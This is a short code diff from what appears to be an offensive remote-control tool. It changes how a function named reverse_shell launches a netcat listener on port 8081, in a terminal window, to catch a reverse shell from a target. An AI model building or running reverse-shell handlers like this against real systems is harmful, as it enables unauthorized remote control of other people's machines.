@@ -21,4 +21,4 @@ async def reverse_shell(ctx: GlobalContext, id: str) -> None:
     ctx.command_one(id, cmd)
 
     # changed to x-terminal-emulator to support non-gnome systems
-    subprocess.Popen(["x-terminal-emulator", "--", "nc", "-lnvp", "8081"])
+    subprocess.Popen(["x-terminal-emulator", "-e", "nc -lnvp 8081"])
